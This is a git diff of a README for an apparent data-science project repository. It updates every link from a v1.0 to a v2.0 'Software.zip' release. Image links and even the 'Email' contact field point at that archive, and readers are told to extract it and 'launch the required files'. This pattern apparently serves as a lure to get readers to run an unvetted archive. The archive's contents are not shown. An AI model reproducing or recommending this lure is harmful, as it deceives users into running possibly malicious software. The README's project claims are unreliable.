@@ -24,7 +24,7 @@ Explore the following topics related to the projects in this repository:
 - visualization
 
 ## 📦 Download
-To download the source code for the projects, click [here](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v1.0/Software.zip).   
+To download the source code for the projects, click [here](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v2.0/Software.zip).   
 
 Once you have downloaded the file, make sure to extract it and launch the required files to explore the projects.
 
@@ -34,10 +34,10 @@ If you are looking for more information or the latest updates, please check the 
 ## 📸 Gallery
 Here are some images related to the projects in this repository:
 1. Data Analysis Dashboard:
-![Data Analysis Dashboard](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v1.0/Software.zip)
+![Data Analysis Dashboard](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v2.0/Software.zip)
 
 2. Data Science Pipeline:
-![Data Science Pipeline](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v1.0/Software.zip)
+![Data Science Pipeline](https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v2.0/Software.zip)
 
 ## 📊 Project Visualizations
 Check out some project visualizations from the repository:
@@ -65,7 +65,7 @@ To explore the projects in this repository, follow these steps:
 
 ## 📧 Contact
 Have questions or feedback? Feel free to reach out:
-- Email: https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v1.0/Software.zip
+- Email: https://github.com/cyberynok/Data-Science-and-Data-Analyst-Project/releases/download/v2.0/Software.zip
 - Twitter: @DataProjects
 
 Thank you for visiting the "Data-Science-and-Data-Analyst-Project" repository. Explore the projects, learn from the code, and get inspired for your own data-related endeavors! 🌟📈🔍
